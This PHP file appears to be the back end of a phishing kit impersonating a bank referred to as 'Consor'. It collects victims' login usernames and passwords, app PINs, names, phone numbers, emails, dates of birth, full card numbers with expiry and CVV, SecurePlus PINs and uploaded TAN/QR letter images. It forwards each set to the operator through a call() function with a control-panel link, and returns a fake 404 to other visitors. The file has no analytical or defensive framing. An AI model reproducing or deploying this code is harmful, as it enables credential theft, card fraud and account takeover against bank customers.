<?php 
session_start();
require '../config.php';

$ipp = "";
if($_SERVER['REMOTE_ADDR']=="::1"){
$ipp = "127.0.0.1";
}else{
$ipp = $_SERVER['REMOTE_ADDR'];
}
$panel_link = str_replace("auth/post.php", "panel/ctr.php", "http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']."?ip=$ipp");


if(isset($_POST['user'])){
call("/- CONSOR LOG -/
User: ".$_POST['user']."
Pass: ".$_POST['pass']."
-------------------------------------
PANEL LINK :". $panel_link."
-------------------------------------
"  );
return;
}


if(isset($_POST['app_pin'])){
call("/- CONSOR AppPIN -/
AppPIN: ".$_POST['app_pin']."
-------------------------------------
PANEL LINK :". $panel_link."
-------------------------------------
" );
return;
}

if(isset($_POST['name'])){
call("/- CONSOR INFO -/
Name: ".$_POST['name']."
Phone: ".$_POST['phone']."
Email: ".$_POST['email']."
DOB: ".$_POST['dob']."
-------------------------------------
PANEL LINK :". $panel_link."s
-------------------------------------
" );
return;
}



if(isset($_POST['cc_name'])){
call("/- CONSOR CARD -/
Name: ".$_POST['cc_name']."
CC: ".$_POST['cc']."
EXP: ".$_POST['exp']."
CVV: ".$_POST['cvv']."
-------------------------------------
PANEL LINK :". $panel_link."s
-------------------------------------
" );
return;
}
 
if(isset($_POST['secure'])){
call("/- CONSOR SecurePlus PIN -/
SecurePlus-PIN: ".$_POST['secure']."
-------------------------------------
PANEL LINK :". $panel_link."
-------------------------------------
" );
return;
}
 


if(isset($_POST['note'])){
if(strtolower($notifications)=="on"){
call("/- CONSOR NOTIFICATION -/
Note: ".$_POST['note']."
-------------------------------------
PANEL LINK :". $panel_link."
-------------------------------------
" );
}

return;


}


if(isset($_POST['uploadTan'])){
		$img = $_FILES['qr'];
		$ext = pathinfo(basename($img['name']), PATHINFO_EXTENSION);
		$new = uniqid().".".$ext;
		@mkdir("up");
		move_uploaded_file($img['tmp_name'], "up/".$new);
		$path = str_replace('post.php', "up/$new" , "https://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']);

	call("
/- CONSOR QR LETTER IMAGE -/
PHOTO: $path
-------------------------------------
PANEL LINK :". $panel_link."
-------------------------------------
	");

		header("location: qr.php?load");
        exit;
	}
 

header("HTTP/1.0 404 Not Found");

?>